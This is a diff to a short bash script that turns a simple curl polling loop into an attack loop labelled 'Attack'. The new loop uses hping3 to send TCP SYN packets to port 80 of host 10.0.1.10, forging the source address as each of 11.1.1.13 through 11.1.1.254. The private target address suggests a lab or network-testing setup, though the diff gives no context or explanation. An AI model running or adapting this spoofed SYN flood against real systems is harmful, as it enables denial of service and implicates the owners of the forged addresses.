@@ -1,12 +1,12 @@
 #!/bin/bash
 
-echo "Ctrl+C interrupt"
+echo "Attack"
+set -x
 
-LENGTH = 0
-
-while :
+VAL="11.1.1."
+INDEX=13
+while [ $INDEX -le 254 ]
 do
-    curl 10.0.1.10
-    sleep 1
+        hping3 10.0.1.10 -S -p 80 -c 5 -a $VAL$INDEX
+        INDEX=$((INDEX+1))
 done
-
